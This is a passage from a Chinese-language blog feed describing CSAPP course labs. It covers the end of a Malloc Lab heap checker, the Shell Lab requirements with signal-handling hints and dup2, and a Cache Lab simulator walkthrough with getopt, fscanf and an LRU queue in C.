class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">/* No fit */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* $end mmfirstfit */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> hsize, halloc, fsize, falloc;</span><br><span class="line"></span><br><span class="line">    checkheap(<span class="number">0</span>);</span><br><span class="line">    hsize = GET_SIZE(HDRP(bp));</span><br><span class="line">    halloc = GET_ALLOC(HDRP(bp));</span><br><span class="line">    fsize = GET_SIZE(FTRP(bp));</span><br><span class="line">    falloc = GET_ALLOC(FTRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hsize == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%p: EOL\n"</span>, bp);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p: header: [%ld:%c] footer: [%ld:%c]\n"</span>, bp,</span><br><span class="line">           hsize, (halloc ? <span class="string">'a'</span> : <span class="string">'f'</span>),</span><br><span class="line">           fsize, (falloc ? <span class="string">'a'</span> : <span class="string">'f'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkblock</span><span class="params">(<span class="keyword">void</span> *bp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">size_t</span>)bp % <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: %p is not doubleword aligned\n"</span>, bp);</span><br><span class="line">    <span class="keyword">if</span> (GET(HDRP(bp)) != GET(FTRP(bp)))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Error: header does not match footer\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * checkheap - Minimal check of the heap for consistency</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">checkheap</span><span class="params">(<span class="keyword">int</span> verbose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp = heap_listp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Heap (%p):\n"</span>, heap_listp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((GET_SIZE(HDRP(heap_listp)) != DSIZE) || !GET_ALLOC(HDRP(heap_listp)))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bad prologue header\n"</span>);</span><br><span class="line">    checkblock(heap_listp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (verbose)</span><br><span class="line">            printblock(bp);</span><br><span class="line">        checkblock(bp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (verbose)</span><br><span class="line">        printblock(bp);</span><br><span class="line">    <span class="keyword">if</span> ((GET_SIZE(HDRP(bp)) != <span class="number">0</span>) || !(GET_ALLOC(HDRP(bp))))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Bad epilogue header\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Malloc Lab的目的是设计一个通用分配器。它基于隐式空闲链表，使用立即边界标记合并方式。&lt;/p&gt;
&lt;p&gt;分配器包含在一个源文件&lt;code&gt;mm.c&lt;/code&gt;中，这次Lab需要完成四个函数:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;tabl
      
    
    </summary>
    
      <category term="CSAPP Lab" scheme="http://larryim.cc/categories/CSAPP-Lab/"/>
    
    
      <category term="CSAPP" scheme="http://larryim.cc/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>Lab5 Shell Lab</title>
    <link href="http://larryim.cc/2017/12/30/CSAPP-Lab-Shell-Lab/"/>
    <id>http://larryim.cc/2017/12/30/CSAPP-Lab-Shell-Lab/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-01-19T04:46:42.600Z</updated>
    
    <content type="html"><![CDATA[<p>Shell Lab需要我们完成一个简单的shell程序。shell是一个交互的命令行界面的解析器。著名的shell程序有Bourne shell (<code>sh</code>)、Bourne-Again shell(<code>bash</code>)、Z shell (<code>zsh</code>)等。shell的框架已经写好，主要需要完成以下函数：</p><ul><li><code>void eval(char *cmdline)</code>：解析命令与执行</li><li><code>void sigchld_handler(int sig)</code>：<code>SIGCHLD</code> 信号处理程序</li><li><code>void sigtstp_handler(int sig)</code>：<code>SIGTSTP</code>(ctrl-z) 信号处理程序</li><li><code>void sigint_handler(int sig)</code>：<code>SIGINT</code>(ctrl-c) 信号处理程序</li></ul><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>shell程序<code>tsh.c</code>应该具备以下功能：</p><ul><li>每一行会输出一个 <code>tsh&gt;</code>，然后等待用户输入</li><li>用户的输入包括<code>name</code>加上零个或多个参数，这些参数之间用一个或多个空格分隔。如果<code>name</code>是内置命令，那么直接执行，否则需要新建一个子进程，并在子进程中完成具体的工作</li><li>不需要支持管道，但是需要支持输入输出重定向，如 <code>tsh&gt; /bin/cat &lt; foo &gt; bar</code>（必须支持在同一行重定向输入以及输出)， 也需要支持内置命令的重定向，如 <code>tsh&gt; jobs &gt; foo</code></li><li>输入 <code>ctrl-c</code> 或 <code>ctrl-z</code> 会给当前的前台进程（包括其子进程）发送 <code>SIGINT</code>(<code>SIGTSTP</code>) 信号，如果没有前台任务，那么这俩信号没有任何效果</li><li>如果输入的命令以 &amp; 结尾，那么就要以后台任务的方式执行，否则按照前台执行</li><li>每个job都有其进程ID(<code>PID</code>)和job ID(<code>JID</code>)都是由<code>tsh</code>指定的正整数，<code>JID</code>以<code>%</code>开头（如 <code>%5</code> 表示 <code>JID</code>为5，而5则表示<code>PID</code>为5，这部分已提供了辅助函数</li><li>支持的内置命令有<ul><li><code>quit</code> 退出shell</li><li><code>jobs</code> 列出所有的后台任务</li><li><code>bg job</code> 给后台job发送<code>SIGCONT</code> 信号来继续执行该任务，具体的job数值可以是PID或JID</li><li><code>fg job</code> 给前台job发送<code>SIGCONT</code> 信号来继续执行该任务，具体的job数值可以是PID或JID</li></ul></li><li><code>tsh</code>应该回收所有的僵尸进程，如果任何job因为接收了没有捕获的信号而终止，<code>tsh</code>应该识别出这个时间并且打印出<code>JID</code>和相关信号的信息。</li></ul><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><ul><li>不要使用 <code>sleep()</code> 来同步</li><li>不要使用忙等待 <code>while(1)</code>;</li><li>使用<code>sigsuspend</code>来同步</li><li>竞争条件</li><li>僵尸进程回收（注意竞争条件以及正确处理信号）</li><li>等待前台任务（仔细思考怎么样才是好的方式）</li><li>不要假定进程的执行顺序</li><li>子进程挂掉的时候应该在一个限定时间内被回收</li><li>不要在多个地方调用<code>waitpid</code>，很容易造成竞争条件，也会造成程序过分复杂</li><li>不要使用任何系统调用来管理 <code>terminal group</code></li><li><code>waitpid</code>, <code>kill</code>, <code>fork</code>, <code>execve</code>, <code>setpgid</code>, <code>sigprocmask</code> 和 <code>sigsuspend</code> 都非常有用，<code>waitpid</code> 中的 <code>WUNTRACED</code> 和 <code>WNOHANG</code>选项也是如此。</li><li>遇到不清晰的用 <code>man</code> 来查看细节</li><li>实现 <code>signal handler</code> 的时候注意给全部的前台进程组发送 <code>SIGINT</code> 和 <code>SIGTSTP</code> 信号</li><li>在 <code>kill</code> 函数中使用 <code>-pid</code> 的格式作为参数</li><li>在shell等待前台工作完成时，需要决定在<code>eval</code>及<code>sigchold handler</code> 具体的分配，这里有一定技巧</li><li>在函数 <code>eval</code> 中，在 <code>fork</code> 出子进程之前，必须使用 <code>sigprocmask</code> 来阻塞 <code>SIGCHLD,</code>SIGINT<code>和</code>SIGTSTP<code>信号，完成之后再取消阻塞。调用</code>addjob<code>的时候也需要如此。注意，因为子进程也继承了之前的各种状态，所以在子进程中调用</code>exec<code>执行新程序的时候注意需要取消阻塞，同样也需要恢复默认的</code>handler`（shell 本身已经忽略了这些信号）</li><li>不要使用 <code>top</code>, <code>less</code>, <code>vi</code>, <code>emacs</code> 之类的复杂程序，使用简单的文本程序如：<code>/bin/cat</code>, <code>/bin/ls</code>, <code>/bin/ps</code>, <code>/bin/echo</code></li><li>因为毕竟不是真正的 shell，所以在<code>fork</code>之后，<code>execve</code>之前，子进程需要调用 <code>setpgid(0, 0)</code>，这样就把子进程放到一个新的进程组里。这样就保证我们的shell前台进程组中唯一的进程，当按下 <code>ctrl-c</code>时，应该捕获<code>SIGINT</code>信号并发送给对应的前台进程组中。</li></ul><h2 id="gdb-操作"><a href="#gdb-操作" class="headerlink" title="gdb 操作"></a>gdb 操作</h2><p>可能用到的gdb相关操作：</p><p>（1）改变gdb信号处理的设置 ：设置gdb接收到SIGINT时不要停止、打印、传递给调试目标程序 。<br>         (gdb) handle SIGINT nostop print pass<br>（2）使用gdb命令直接向调试的应用程序发送信号 ：首先在你希望发送信号的语句处设置断点，然后运行程序，当停止到断点所在位置后，用gdb的signal命令发送信号给调试目标程序 。<br>          (gdb) signal SIGINT </p><p>（3）调试多进程程序：mode到可选值为parent和child表示fork之后调试父进程还是子进程。</p><pre><code>(gdb) set follow-fork-mode mode</code></pre><h2 id="dup-dup2-I-O重定向"><a href="#dup-dup2-I-O重定向" class="headerlink" title="dup/dup2 I/O重定向"></a>dup/dup2 I/O重定向</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dup, dup2 -- duplicate an existing file descriptor</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup</span><span class="params">(<span class="keyword">int</span> newfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dup2</span><span class="params">(<span class="keyword">int</span> newfd, <span class="keyword">int</span> oldfd)</span></span>;</span><br></pre></td></tr></table></figure><p><code>dup2</code>函数复制描述符表项<code>oldfd</code>到描述符表项<code>newfd</code>，覆盖描述符表项<code>newfd</code>以前的内容。如果<code>newfd</code>已经打开了，<code>dup2</code>会在复制<code>oldfd</code>之前关闭<code>newfd</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Shell Lab需要我们完成一个简单的shell程序。shell是一个交互的命令行界面的解析器。著名的shell程序有Bourne shell (&lt;code&gt;sh&lt;/code&gt;)、Bourne-Again shell(&lt;code&gt;bash&lt;/code&gt;)、Z shell 
      
    
    </summary>
    
      <category term="CSAPP Lab" scheme="http://larryim.cc/categories/CSAPP-Lab/"/>
    
    
      <category term="CSAPP" scheme="http://larryim.cc/tags/CSAPP/"/>
    
  </entry>
  
  <entry>
    <title>Lab4 Cache Lab</title>
    <link href="http://larryim.cc/2017/12/30/CSAPP-Lab-Cache-Lab/"/>
    <id>http://larryim.cc/2017/12/30/CSAPP-Lab-Cache-Lab/</id>
    <published>2017-12-29T16:00:00.000Z</published>
    <updated>2018-01-18T06:56:50.838Z</updated>
    
    <content type="html"><![CDATA[<p>CMU 15-213 Lab4 Cache Lab</p><ul><li><a href="http://csapp.cs.cmu.edu/3e/labs.html">Lab 下载地址</a></li><li><a href="https://scs.hosted.panopto.com/Panopto/Pages/Sessions/List.aspx#folderID=%22b96d90ae-9871-4fae-91e2-b1627b43e25e%22">Recitation讲解</a></li></ul><p>Cache Lab可以帮助理解缓存对C程序的影响。Lab包括两部分，第一部分用C语言写一个缓存模拟器，第二部分写一个小型矩阵的转置函数，使缓存不命中降到最低。</p><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p>Part A的任务是写一个C语言缓存模拟器，输入Valgrind的<code>trace file</code>，输出缓存命中次数hit_count，缓存不命中次数miss_count,驱逐次数eviction_count.</p><h3 id="Trance-File"><a href="#Trance-File" class="headerlink" title="Trance File"></a>Trance File</h3><p>要写这样一个缓存模拟器，我们肯定首先要了解输入的内容。Valgrind的<code>--trace-mem=yes</code>选项可以追踪内存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l</span><br><span class="line"></span><br><span class="line"> L 04224488,4</span><br><span class="line">I  0400a0ab,8</span><br><span class="line"> S ffefffdf8,8</span><br><span class="line">I  0400a0b3,5</span><br><span class="line"> M ffefffd48,8</span><br></pre></td></tr></table></figure><p>上面这个命令用valgrind打印出了在执行<code>ls -l</code>过程中内存的使用情况。输出的格式是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[空格] 操作符(I/L/S/M) 地址, 字节大小</span><br><span class="line">[space] operator(I/L/S/M) address, size</span><br></pre></td></tr></table></figure><p>操作符有四种I/L/S/M，分别代表指令加载(I)/数据加载(L)/数据存储(S)/M(数据修改)。其中指令加载(I)前面没有空格。</p><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>接下来还需要了解命令行参数，缓存模拟器可以根据命令行参数设置成不同的规格。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./csim-ref -s 4 -E 1 -b 4</span><br></pre></td></tr></table></figure><p>其中<code>-s, -E, -b</code>分别表示：</p><ul><li><code>-s &lt;s&gt;</code> 有$S=2^s$个组，</li><li><code>-E &lt;E&gt;</code> E个相联度，即每组E行</li><li><code>-b &lt;b&gt;</code> 每一行是由一个$B=2^b$字节的数据块组成。</li></ul><p>所以<code>-s 4 -E 1 -b 4</code>表示，高速缓存有16个组，每组1行，每一行是由一个16个字节的数据块组成的。</p><p>解析命令行参数可以使用<code>getopt</code>函数，在使用时包含<code>unistd.h</code>头文件。可使用<code>man 3 getopt</code>查询函数用法和示例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getopt -- get option character from command line argument list</span><br><span class="line">getopt(int argc, char * const argv[], const char *optstring);</span><br></pre></td></tr></table></figure><p>字符串<code>optstring</code>可以下列元素，</p><ul><li>单个字符，表示选项，</li><li>单个字符后接一个冒号：表示该选项后必须跟一个参数。参数紧跟在选项后或者以空格隔开。该参数的指针赋给optarg。</li><li>单个字符后跟两个冒号, 这时选项的参数是可选的(可有可无)。有参数时，参数与选项之间不能有空格</li></ul><p>所以输入时的处理可以如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;-%c %s &quot;, opt, optarg);</span><br><span class="line">switch (opt)</span><br><span class="line">&#123;</span><br><span class="line">case &apos;s&apos;:</span><br><span class="line">s = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;E&apos;:</span><br><span class="line">E = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;b&apos;:</span><br><span class="line">b = atoi(optarg);</span><br><span class="line">break;</span><br><span class="line">case &apos;t&apos;:</span><br><span class="line">filename = optarg;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">printf(&quot;Wrong argumet \n&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>用<code>getopt()</code>函数处理完命令行参数，也就知道了需要模拟的高速缓存的具体细节。下一步就是读取Valgrind文本文件，进行处理。 使用<code>fscanf()</code>函数可以很方便的从文件中读取内容。同样的用<code>man 3 fscanf</code>可以查询<code>fscanf()</code>的具体用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fscanf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br></pre></td></tr></table></figure><p><code>fscanf()</code>依次输入<code>trace file</code>中的<code>[space]operator/address/size</code>。由于地址的长度大小不一定，所以用<code>malloc()</code>动态分配。<code>fscanf()</code>中的<code>%[^,]</code>表示读入任意多的字符，直到遇到逗号(<code>,</code>)为止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp, <span class="string">" %c %[^,],%c"</span>, &amp;<span class="keyword">operator</span>, address, &amp;size)==<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>注意在调用<code>fscanf()</code>函数时，要确认函数返回值是否等于要赋值的参数数量<code>fscanf()==3</code>。</p><h3 id="模拟缓存"><a href="#模拟缓存" class="headerlink" title="模拟缓存"></a>模拟缓存</h3><p>前面的几步都是为了这一步做好准备，现在知道了缓存的细节，读取了<code>trace file</code>, 下一步就是要构造一个缓存了。可以用一个多维数组构造缓存，其中一维表示组，一维表示行，另一维表示块。其实它也就是一个二维的缓存行，每一行有$B$字节，有$S$组，每组$E$行，一共有$S\times E$行。那么，我们先构造一个缓存行，然后再构造一个$S\times E$行的数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct cacheline &#123;</span><br><span class="line">     int valid_bit; // if 1, valid</span><br><span class="line">     unsigned tag; // tag</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line">struct cache_line cache[S][E]</span><br></pre></td></tr></table></figure><p>接下来的一个难点是如何部署LRU(Least Recently Used replacement policy)策略。一个好的方法是使用队列, 在节点中存放地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_TYPE cacheline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* define node of queue*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_node</span> &#123;</span></span><br><span class="line">QUEUE_TYPE* value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* define a queue */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">int</span> full_size;</span><br><span class="line">node *head;</span><br><span class="line">node *tail;</span><br><span class="line">&#125; <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a queue */</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span>* <span class="title">create_queue</span><span class="params">(<span class="built_in">queue</span>* q, <span class="keyword">int</span> full_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">q = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line"><span class="keyword">if</span> (q==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Memory error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;size = <span class="number">0</span>;</span><br><span class="line">q-&gt;full_size = full_size;</span><br><span class="line"><span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop_queue */</span></span><br><span class="line"><span class="function">QUEUE_TYPE* <span class="title">pop</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">node *old_head;</span><br><span class="line">QUEUE_TYPE* old_value; </span><br><span class="line">old_head = q-&gt;head;</span><br><span class="line">q-&gt;head = q-&gt;head-&gt;next;</span><br><span class="line">q-&gt;size -= <span class="number">1</span>;</span><br><span class="line">old_value = old_head-&gt;value;</span><br><span class="line"><span class="built_in">free</span>(old_head);</span><br><span class="line"><span class="keyword">return</span> old_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* queue is empty */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_empty</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (q-&gt;size == <span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* queue is full */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_full</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (q-&gt;size == q-&gt;full_size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* destory_queue */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (!is_empty(q))</span><br><span class="line">pop(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* push_queuq */</span></span><br><span class="line"><span class="function">QUEUE_TYPE* <span class="title">push</span><span class="params">(<span class="built_in">queue</span> *q, QUEUE_TYPE* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* create a new node */</span></span><br><span class="line">node *new_node;</span><br><span class="line">new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">new_node-&gt;value = value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_empty(q))</span><br><span class="line">&#123;</span><br><span class="line">q-&gt;head = new_node;</span><br><span class="line">q-&gt;tail = new_node;</span><br><span class="line">q-&gt;size = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">q-&gt;tail-&gt;next = new_node;</span><br><span class="line">q-&gt;tail = new_node;</span><br><span class="line">q-&gt;size = q-&gt;size + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ((q-&gt;size) &gt; (q-&gt;full_size))</span><br><span class="line"><span class="keyword">return</span> pop(q);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就是细节的处理了，包括内存分配，从地址中提取标记，组索引，块偏移，把输入的16进制字符串转化为数字。这些都非常简单，最终主程序如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span 